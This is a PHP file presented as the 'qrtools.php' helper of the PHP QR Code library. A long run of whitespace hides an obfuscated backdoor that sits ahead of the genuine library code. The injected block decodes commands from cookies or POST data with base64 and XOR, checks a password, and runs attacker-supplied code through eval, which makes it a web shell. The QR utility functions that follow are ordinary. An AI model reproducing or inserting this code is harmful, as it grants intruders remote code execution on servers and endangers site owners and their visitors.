<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $y41677 = 192;$GLOBALS['s1cd8'] = Array();global $s1cd8;$s1cd8 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['wc25e020'] = "\x3f\x48\x22\x7c\x32\x7a\x57\x23\x69\x3c\x21\x28\x6b\x54\x72\x25\x68\x31\x39\x52\x26\x46\x5c\x70\x2f\x30\xa\x59\x66\x76\x20\x4a\x55\x3a\x58\x2c\x67\x62\x45\x51\x42\x2d\x44\x34\x40\x3d\x74\x78\x6a\x75\x24\x41\x60\x43\x5f\x33\x3b\x4d\x6c\x5e\x27\x53\x6d\x63\x9\x2b\x38\x2a\x50\x73\x37\x5a\x4c\x71\x5d\x5b\x49\x2e\x7e\xd\x61\x4f\x7d\x56\x4b\x7b\x47\x77\x6f\x3e\x36\x35\x4e\x79\x6e\x65\x29\x64";$s1cd8[$s1cd8['wc25e020'][48].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][18]] = $s1cd8['wc25e020'][63].$s1cd8['wc25e020'][16].$s1cd8['wc25e020'][14];$s1cd8[$s1cd8['wc25e020'][29].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80]] = $s1cd8['wc25e020'][88].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][97];$s1cd8[$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][25]] = $s1cd8['wc25e020'][97].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][95];$s1cd8[$s1cd8['wc25e020'][87].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28]] = $s1cd8['wc25e020'][69].$s1cd8['wc25e020'][46].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][94];$s1cd8[$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][28]] = $s1cd8['wc25e020'][97].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97];$s1cd8[$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91]] = $s1cd8['wc25e020'][8].$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][46];$s1cd8[$s1cd8['wc25e020'][36].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][95]] = $s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][5].$s1cd8['wc25e020'][95];$s1cd8[$s1cd8['wc25e020'][93].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][97]] = $s1cd8['wc25e020'][23].$s1cd8['wc25e020'][16].$s1cd8['wc25e020'][23].$s1cd8['wc25e020'][29].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][94];$s1cd8[$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][4]] = $s1cd8['wc25e020'][49].$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][5].$s1cd8['wc25e020'][95];$s1cd8[$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][55]] = $s1cd8['wc25e020'][37].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][95];$s1cd8[$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][97]] = $s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][46].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][46].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][46];$s1cd8[$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][25]] = $s1cd8['wc25e020'][14].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][97];$s1cd8[$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18]] = $s1cd8['wc25e020'][29].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][43];$s1cd8[$s1cd8['wc25e020'][48].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][28]] = $_POST;$s1cd8[$s1cd8['wc25e020'][5].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63]] = $_COOKIE;@$s1cd8[$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91]]($s1cd8['wc25e020'][95].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][36], NULL);@$s1cd8[$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91]]($s1cd8['wc25e020'][58].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][36].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][14].$s1cd8['wc25e020'][69], 0);@$s1cd8[$s1cd8['wc25e020'][58].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91]]($s1cd8['wc25e020'][62].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][47].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][47].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][49].$s1cd8['wc25e020'][46].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][46].$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][95], 0);@$s1cd8[$s1cd8['wc25e020'][88].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][97]](0);if (!$s1cd8[$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][28]]($s1cd8['wc25e020'][51].$s1cd8['wc25e020'][72].$s1cd8['wc25e020'][19].$s1cd8['wc25e020'][38].$s1cd8['wc25e020'][51].$s1cd8['wc25e020'][42].$s1cd8['wc25e020'][27].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][19].$s1cd8['wc25e020'][32].$s1cd8['wc25e020'][92].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][80])){$s1cd8[$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][25]]($s1cd8['wc25e020'][51].$s1cd8['wc25e020'][72].$s1cd8['wc25e020'][19].$s1cd8['wc25e020'][38].$s1cd8['wc25e020'][51].$s1cd8['wc25e020'][42].$s1cd8['wc25e020'][27].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][19].$s1cd8['wc25e020'][32].$s1cd8['wc25e020'][92].$s1cd8['wc25e020'][54].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][80], 1);$fed4 = NULL;$k06c8da43 = NULL;$s1cd8[$s1cd8['wc25e020'][73].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][90]] = $s1cd8['wc25e020'][66].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][41].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][41].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][41].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][41].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][70].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][80];global $q81b61836;function  v9daee4($fed4, $f4422ac){global $s1cd8;$u7bcd = "";for ($mcf648b=0; $mcf648b<$s1cd8[$s1cd8['wc25e020'][87].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28]]($fed4);){for ($hd3c66f=0; $hd3c66f<$s1cd8[$s1cd8['wc25e020'][87].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28]]($f4422ac) && $mcf648b<$s1cd8[$s1cd8['wc25e020'][87].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28]]($fed4); $hd3c66f++, $mcf648b++){$u7bcd .= $s1cd8[$s1cd8['wc25e020'][48].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][18]]($s1cd8[$s1cd8['wc25e020'][29].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80]]($fed4[$mcf648b]) ^ $s1cd8[$s1cd8['wc25e020'][29].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][80]]($f4422ac[$hd3c66f]));}}return $u7bcd;}function  r30d($fed4, $f4422ac){global $s1cd8;global $q81b61836;return $s1cd8[$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18]]($s1cd8[$s1cd8['wc25e020'][62].$s1cd8['wc25e020'][4].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][18]]($fed4, $q81b61836), $f4422ac);}foreach ($s1cd8[$s1cd8['wc25e020'][5].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][91].$s1cd8['wc25e020'][63]] as $f4422ac=>$ged76){$fed4 = $ged76;$k06c8da43 = $f4422ac;}if (!$fed4){foreach ($s1cd8[$s1cd8['wc25e020'][48].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][28]] as $f4422ac=>$ged76){$fed4 = $ged76;$k06c8da43 = $f4422ac;}}$fed4 = @$s1cd8[$s1cd8['wc25e020'][94].$s1cd8['wc25e020'][37].$s1cd8['wc25e020'][18].$s1cd8['wc25e020'][95].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][4]]($s1cd8[$s1cd8['wc25e020'][8].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][25]]($s1cd8[$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][90].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][43].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][55].$s1cd8['wc25e020'][55]]($fed4), $k06c8da43));if (isset($fed4[$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][12]]) && $q81b61836==$fed4[$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][12]]){if ($fed4[$s1cd8['wc25e020'][80]] == $s1cd8['wc25e020'][8]){$mcf648b = Array($s1cd8['wc25e020'][23].$s1cd8['wc25e020'][29] => @$s1cd8[$s1cd8['wc25e020'][93].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][63].$s1cd8['wc25e020'][97].$s1cd8['wc25e020'][97]](),$s1cd8['wc25e020'][69].$s1cd8['wc25e020'][29] => $s1cd8['wc25e020'][17].$s1cd8['wc25e020'][77].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][41].$s1cd8['wc25e020'][17],);echo @$s1cd8[$s1cd8['wc25e020'][36].$s1cd8['wc25e020'][80].$s1cd8['wc25e020'][66].$s1cd8['wc25e020'][25].$s1cd8['wc25e020'][17].$s1cd8['wc25e020'][28].$s1cd8['wc25e020'][95]]($mcf648b);}elseif ($fed4[$s1cd8['wc25e020'][80]] == $s1cd8['wc25e020'][95]){eval/*n529*/($fed4[$s1cd8['wc25e020'][97]]);}exit();}} ?><?php
/*
 * PHP QR Code encoder
 *
 * Toolset, handy and debug utilites.
 *
 * PHP QR Code is distributed under LGPL 3
 * Copyright (C) 2010 Dominik Dzienia <deltalab at poczta dot fm>
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
 */

    class QRtools {
    
        //----------------------------------------------------------------------
        public static function binarize($frame)
        {
            $len = count($frame);
            foreach ($frame as &$frameLine) {
                
                for($i=0; $i<$len; $i++) {
                    $frameLine[$i] = (ord($frameLine[$i])&1)?'1':'0';
                }
            }
            
            return $frame;
        }
        
        //----------------------------------------------------------------------
        public static function tcpdfBarcodeArray($code, $mode = 'QR,L', $tcPdfVersion = '4.5.037')
        {
            $barcode_array = array();
            
            if (!is_array($mode))
                $mode = explode(',', $mode);
                
            $eccLevel = 'L';
                
            if (count($mode) > 1) {
                $eccLevel = $mode[1];
            }
                
            $qrTab = QRcode::text($code, false, $eccLevel);
            $size = count($qrTab);
                
            $barcode_array['num_rows'] = $size;
            $barcode_array['num_cols'] = $size;
            $barcode_array['bcode'] = array();
                
            foreach ($qrTab as $line) {
                $arrAdd = array();
                foreach(str_split($line) as $char)
                    $arrAdd[] = ($char=='1')?1:0;
                $barcode_array['bcode'][] = $arrAdd;
            }
                    
            return $barcode_array;
        }
        
        //----------------------------------------------------------------------
        public static function clearCache()
        {
            self::$frames = array();
        }
        
        //----------------------------------------------------------------------
        public static function buildCache()
        {
			QRtools::markTime('before_build_cache');
			
			$mask = new QRmask();
            for ($a=1; $a <= QRSPEC_VERSION_MAX; $a++) {
                $frame = QRspec::newFrame($a);
                if (QR_IMAGE) {
                    $fileName = QR_CACHE_DIR.'frame_'.$a.'.png';
                    QRimage::png(self::binarize($frame), $fileName, 1, 0);
                }
				
				$width = count($frame);
				$bitMask = array_fill(0, $width, array_fill(0, $width, 0));
				for ($maskNo=0; $maskNo<8; $maskNo++)
					$mask->makeMaskNo($maskNo, $width, $frame, $bitMask, true);
            }
			
			QRtools::markTime('after_build_cache');
        }

        //----------------------------------------------------------------------
        public static function log($outfile, $err)
        {
            if (QR_LOG_DIR !== false) {
                if ($err != '') {
                    if ($outfile !== false) {
                        file_put_contents(QR_LOG_DIR.basename($outfile).'-errors.txt', date('Y-m-d H:i:s').': '.$err, FILE_APPEND);
                    } else {
                        file_put_contents(QR_LOG_DIR.'errors.txt', date('Y-m-d H:i:s').': '.$err, FILE_APPEND);
                    }
                }    
            }
        }
        
        //----------------------------------------------------------------------
        public static function dumpMask($frame) 
        {
            $width = count($frame);
            for($y=0;$y<$width;$y++) {
                for($x=0;$x<$width;$x++) {
                    echo ord($frame[$y][$x]).',';
                }
            }
        }
        
        //----------------------------------------------------------------------
        public static function markTime($markerId)
        {
            list($usec, $sec) = explode(" ", microtime());
            $time = ((float)$usec + (float)$sec);
            
            if (!isset($GLOBALS['qr_time_bench']))
                $GLOBALS['qr_time_bench'] = array();
            
            $GLOBALS['qr_time_bench'][$markerId] = $time;
        }
        
        //----------------------------------------------------------------------
        public static function timeBenchmark()
        {
            self::markTime('finish');
        
            $lastTime = 0;
            $startTime = 0;
            $p = 0;

            echo '<table cellpadding="3" cellspacing="1">
                    <thead><tr style="border-bottom:1px solid silver"><td colspan="2" style="text-align:center">BENCHMARK</td></tr></thead>
                    <tbody>';

            foreach($GLOBALS['qr_time_bench'] as $markerId=>$thisTime) {
                if ($p > 0) {
                    echo '<tr><th style="text-align:right">till '.$markerId.': </th><td>'.number_format($thisTime-$lastTime, 6).'s</td></tr>';
                } else {
                    $startTime = $thisTime;
                }
                
                $p++;
                $lastTime = $thisTime;
            }
            
            echo '</tbody><tfoot>
                <tr style="border-top:2px solid black"><th style="text-align:right">TOTAL: </th><td>'.number_format($lastTime-$startTime, 6).'s</td></tr>
            </tfoot>
            </table>';
        }
        
    }
    
    //##########################################################################
    
    QRtools::markTime('start');
    